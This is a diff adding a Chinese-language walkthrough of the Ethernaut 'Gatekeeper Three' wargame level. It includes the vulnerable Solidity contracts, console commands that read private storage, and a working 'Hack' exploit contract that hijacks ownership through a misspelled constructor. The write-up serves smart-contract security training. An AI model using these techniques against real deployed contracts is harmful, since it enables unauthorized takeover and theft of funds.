@@ -904,7 +904,7 @@ contract Privacy {
 
 ## 13. Gatekeeper One
 
-越过守门人并注册为参赛者
+越过守门人并注册为新成员
 
 ```js
 // SPDX-License-Identifier: MIT
@@ -2421,3 +2421,119 @@ interface INotifyable {
 ### 参考资料
 
 - [Custom Errors in Solidity | Solidity Blog](https://blog.soliditylang.org/2021/04/21/custom-errors/)
+
+## 28. Gatekeeper Three
+
+再次成为 `entrant` XD
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleTrick {
+  GatekeeperThree public target;
+  address public trick;
+  uint private password = block.timestamp;
+
+  constructor (address payable _target) {
+    target = GatekeeperThree(_target);
+  }
+    
+  function checkPassword(uint _password) public returns (bool) {
+    if (_password == password) {
+      return true;
+    }
+    password = block.timestamp;
+    return false;
+  }
+    
+  function trickInit() public {
+    trick = address(this);
+  }
+    
+  function trickyTrick() public {
+    if (address(this) == msg.sender && address(this) != trick) {
+      target.getAllowance(password);
+    }
+  }
+}
+
+contract GatekeeperThree {
+  address public owner;
+  address public entrant;
+  bool public allow_enterance = false;
+  SimpleTrick public trick;
+
+  function construct0r() public {
+      owner = msg.sender;
+  }
+
+  modifier gateOne() {
+    require(msg.sender == owner);
+    require(tx.origin != owner);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(allow_enterance == true);
+    _;
+  }
+
+  modifier gateThree() {
+    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+      _;
+    }
+  }
+
+  function getAllowance(uint _password) public {
+    if (trick.checkPassword(_password)) {
+        allow_enterance = true;
+    }
+  }
+
+  function createTrick() public {
+    trick = new SimpleTrick(payable(address(this)));
+    trick.trickInit();
+  }
+
+  function enter() public gateOne gateTwo gateThree returns (bool entered) {
+    entrant = tx.origin;
+    return true;
+  }
+
+  receive () external payable {}
+}
+```
+
+- 调用 `GatekeeperThree.createTrick()` 初始化 `trick`
+
+    ```js
+    >> contract.createTrick();
+    ```
+
+- `GatekeeperThree.construct0r()` 由于 typo 成为普通函数，可直接调用变更 `owner`，使用合约调用 `GatekeeperThree.enter()` 能够通过 `gateOne`
+- `gateTwo` 需要通过 `GatekeeperThree.getAllowance()` 使 `allow_enterance = true`，由 `getStorageAt()` 获取 `SimpleTrick.password`，以通过 `trick.checkPassword()`
+
+    ```js
+    >> web3.eth.getStorageAt(await contract.trick(), 2);
+    "0x0000000000000000000000000000000000000000000000000000000064047a80" 
+    ```
+
+- 通过 `gateThree` 需要合约 `GatekeeperThree` 内的余额大于 0.001 ether，且无法向 `owner` 发送 0.001 ether（`owner` 不提供 `payable` 的 `receive` 或 `fallback` 函数）
+
+```js
+interface IGatekeeperThree {
+    function construct0r() external;
+    function getAllowance(uint) external;
+    function enter() external;
+}
+
+contract Hack {
+    function exploit(address payable instance, uint pass) external payable {
+        instance.transfer(0.001001 ether);
+        IGatekeeperThree(instance).getAllowance(pass);
+        IGatekeeperThree(instance).construct0r();
+        IGatekeeperThree(instance).enter();
+    }
+}
+```
